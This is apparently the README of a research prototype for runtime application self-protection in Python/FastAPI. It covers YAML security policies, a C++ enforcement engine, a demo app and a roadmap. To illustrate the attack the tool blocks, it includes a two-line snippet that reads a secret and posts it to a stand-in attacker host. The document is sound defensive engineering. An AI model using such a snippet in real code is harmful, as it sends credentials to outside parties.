# Sentinel RASP

> **Runtime Application Self-Protection with Formal Security Property Enforcement**

Sentinel RASP is a cybersecurity research prototype intended to protect backend applications while they execute. Its first target is Python/FastAPI. Developers should be able to state security requirements in a friendly policy format—rather than hand-writing temporal logic—and have them enforced before a sensitive operation completes.

> **Status: v0.1 executable prototype.** The repository now includes a focused Python/FastAPI + C++ vertical slice for explicit secret markers and `requests` outbound calls. Dashboard, proof, remediation, and broad instrumentation remain future work.

## The core idea

```text
Developer -> security property -> Policy Builder / DSL -> Policy Compiler
                                                       |
                                             Formal/internal model
                                                       |
                                           Runtime instrumentation
                                                       |
                                                FastAPI application
                                                       |
                                                security event
                                                       |
                                            C++ enforcement engine
                                                       |
                                                 ALLOW / BLOCK
                                                       |
                              Patch generation/validation (planned)
                                                       |
                                 Formal verification (research goal)
```

Sentinel is a layer inside the application runtime. It does **not** replace firewalls, WAFs, DDoS protection, TLS, or network security. Those controls protect traffic and infrastructure; Sentinel is intended to control what the backend does after a request reaches the application.

## Why runtime protection?

```text
Client -> encrypted TLS traffic -> network -> TLS termination -> HTTP request
      -> backend application -> business logic
      -> database / filesystem / external network / process execution
```

Sentinel should not packet-sniff encrypted traffic. It is intended to observe runtime events after the application has relevant data and before supported sensitive operations execute:

```text
SECRET_ACCESS   FILE_READ      FILE_WRITE    NETWORK_CONNECT
NETWORK_SEND    DB_QUERY       PROCESS_EXEC  AUTH_SUCCESS / AUTH_FAILURE
```

Events should carry only policy-relevant context where practical: event type, request ID, destination, resource, data classification, security context, and operation ID. This limits unnecessary sensitive-data processing and overhead.

## Example: secret-exfiltration prevention

Human requirement: **“An API key must never be sent to an untrusted network destination.”**

```yaml
name: prevent_secret_exfiltration
when:
  event: SECRET_ACCESS
forbid:
  event: NETWORK_SEND
condition:
  destination: UNTRUSTED
action: [BLOCK, LOG, GENERATE_PATCH]
```

Conceptual formal form:

```text
G(API_KEY_READ -> !NETWORK_SEND(API_KEY, UNTRUSTED))
```

`G` means “always.” This syntax is illustrative and may change.

```python
secret = get_secret()
requests.post("https://attacker.example", data=secret)
```

Desired flow:

```text
SECRET_ACCESS -> NETWORK_SEND -> intercept -> policy evaluation
              -> untrusted destination -> violation -> BLOCK
```

The goal is to stop the network operation before the secret leaves the process.

## Policy creation and enforcement (planned)

A proposed web policy builder would let a developer select a protected resource, runtime event, forbidden operation, conditions, trusted destinations, and violation action. It would produce this pipeline:

```text
Human requirement -> machine-readable policy -> formal representation
-> policy automaton/state machine -> runtime enforcement
```

Policies are intended to compile into a finite-state machine or equivalent:

```text
START -> SECRET_ACCESS -> SECRET_PRESENT -> NETWORK_SEND?
                                             |- trusted   -> ALLOW
                                             `- untrusted -> BLOCK
```

The intended FastAPI integration may look like this, but is not available yet:

```python
from fastapi import FastAPI
from sentinel import protect

app = FastAPI()
protect(app, policy="security.yaml")
```

Automatic instrumentation and commands such as `pip install sentinel-rasp` are future interfaces, not current instructions.

## C++ core, remediation, and verification

The enforcement core is proposed in C++ for low per-event overhead, quick policy evaluation, efficient state transitions, native integration, and future language support. Python could use pybind11 or an equivalent bridge. No core, bridge, or benchmark exists in this repository.

The intended remediation workflow is deliberately constrained:

```text
Violation -> capture trace/context -> candidate patch -> controlled test environment
-> regression/security tests -> verify property -> accept or reject
```

For example, an early remediation pattern might turn unsafe SQL concatenation into a parameterized query. Sentinel does not claim it can patch arbitrary vulnerabilities.

Future formal work would model policies, runtime states, events, transitions, and allow/block decisions. Z3/SMT, TLA+, Lean, or another suitable tool may be evaluated. No theorem or proof artifact is included, so no formal soundness claim is made.

“Zero asymptotic performance overhead” is a research goal, not “zero milliseconds.” The aim is to preserve complexity when possible:

```text
Original:  T(n)  = O(n)
Protected: T'(n) = O(n)
```

Constant-factor latency, CPU, and memory costs can still exist and must be measured using baseline/protected benchmarks. No measurements are available yet.

## Implementation status

| Capability | Status |
|---|---|
| Python/FastAPI support and `requests` instrumentation | Implemented (MVP) |
| User-defined constrained YAML policy loader | Implemented (MVP) |
| C++ engine, live blocking, structured logging | Implemented (MVP) |
| Policy-builder UI and dashboard | Planned |
| Patch generation and validation | Research direction |
| Formal proof artifacts | Research goal |
| Benchmark suite / complexity analysis | Research goal |
| Other language runtimes | Future |

## Running the MVP

Install the package and test dependencies, then run the suite:

```text
python -m pip install -e . pytest
python -m pytest -q
```

The first native-engine use compiles `core/cpp` with `g++` into a local runtime
artifact. The protected demonstration app is in `examples/vulnerable-fastapi`:

```text
uvicorn app:app --app-dir examples/vulnerable-fastapi
```

Open `http://127.0.0.1:8000/` for the judge-facing dashboard. Its **Send
malicious request** button calls `POST /cases/secret-untrusted`, which attempts
to send an explicitly marked secret to an untrusted destination and returns a
403 before `requests` executes I/O. The trusted control uses an in-app local
receiver, so it requires no second service.

This MVP supports only explicitly marked values (`sentinel.secret(value)`) and
outbound `requests` calls. `localhost`, `127.0.0.1`, and `::1` are the fixed
trusted destinations used by the demo/tests; every other host is untrusted.
Blocked operations are also appended to
`examples/vulnerable-fastapi/security-events.json`; retrieve them through
`GET /security-events` while the demo is running.

## Target demo story

```text
1. Define “Prevent Secret Exfiltration.”
2. Compile it and protect a FastAPI app.
3. An attacker triggers an endpoint that reads and sends a secret externally.
4. Sentinel intercepts NETWORK_SEND.
5. The engine detects an untrusted destination.
6. The operation is blocked and logged.
7. A constrained patch may be generated and validated.
```

```text
SECURITY VIOLATION
Policy: Prevent Secret Exfiltration
Event: NETWORK_SEND | Resource: API_KEY | Destination: attacker.example
Decision: BLOCKED | Status: PROTECTED
```

## Proposed stack and layout

Python/FastAPI; C++ core; pybind11 or equivalent bridge; YAML/JSON and a DSL; lightweight web UI; SQLite if persistence is needed; Pytest, C++ tests, security attack tests; Docker. The actual technology choices remain open until implementation begins.

```text
sentinel-rasp/
├── core/cpp/          ├── python/sentinel/     ├── policy/
├── instrumentation/   ├── verifier/            ├── patcher/
├── dashboard/         ├── examples/vulnerable-fastapi/
├── tests/{unit,integration,security}/  ├── benchmarks/  └── proofs/
```

This is a proposed layout, not the current repository structure.

## Limitations and roadmap

Initial scope is Python/FastAPI. Temporal policies may begin constrained; remediation and verification would cover only supported patterns/models; enforcement can add constant overhead; and Sentinel cannot replace network controls, WAFs, or DDoS protection.

| Version | Planned focus |
|---|---|
| v0.1 | FastAPI runtime, instrumentation, C++ engine, basic policies, blocking |
| v0.2 | Policy builder/compiler, richer event model, dashboard |
| v0.3 | Constrained patching, validation, security regression tests |
| v0.4 | Formal model and machine-checkable proof artifacts |
| v0.5 | Benchmarks, complexity analysis, additional runtimes |

## Why Sentinel differs

A scanner finds weaknesses before deployment; a WAF filters incoming traffic. Sentinel’s research proposition is developer-defined properties enforced against application-runtime behavior, with formal verification and automated remediation treated as explicit future goals—not marketing claims.
